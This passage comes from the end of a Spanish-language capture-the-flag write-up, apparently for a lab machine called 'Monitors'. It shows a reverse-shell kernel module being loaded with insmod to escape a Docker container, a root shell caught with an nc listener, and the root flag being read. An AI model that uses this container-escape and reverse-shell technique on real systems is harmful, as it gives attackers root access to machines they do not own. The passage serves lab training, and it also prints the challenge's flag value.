Makefile		      gradle2795579439185181258.bin  gradle6644211106987001499.bin  gradle9039635524913268865.bin  hsperfdata_root  reverse-shell.ko	 shell.sh
Module.symvers		      gradle2983053951583899525.bin  gradle7006611085073049553.bin  gradle9084471384540617701.bin  linpeas.sh	    reverse-shell.mod.c
gradle1338051207622881975.bin  gradle3783653524079408204.bin  gradle7211342044412775236.bin  gradle9170701421662864177.bin  modules.order    reverse-shell.mod.o
gradle251280844494394051.bin   gradle4550055017114582402.bin  gradle8316659095765584843.bin  gradle984417515461424419.bin   reverse-shell.c  reverse-shell.o
```

finalmente debemos ponernos en escucha en el puerto especifico con `ncat` y ejecutar el `reverse-shell.ko` con `insmod`.


```bash
root@b097fc57960e:/tmp# insmod reverse-shell.ko 
root@b097fc57960e:/tmp#
```

y recibimos la conexión como `root` en la maquina real.

```bash
marcus@monitors:~$ nc -nlvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.10.238 36840 received!
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@monitors:/# whoami
whoami
root
root@monitors:/# hostname -I
hostname -I
10.10.10.238 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:29a3
```

Lo que nos queda ahora es ir al directorio personal del usuario `root` y visualizar la segunda flag `root.txt` 😄.

```bash
root@monitors:/# cd /root
cd /root
root@monitors:/root# cat root.txt
cat root.txt
9f3208a5ff66eb9a612aaba91ea35eae
```

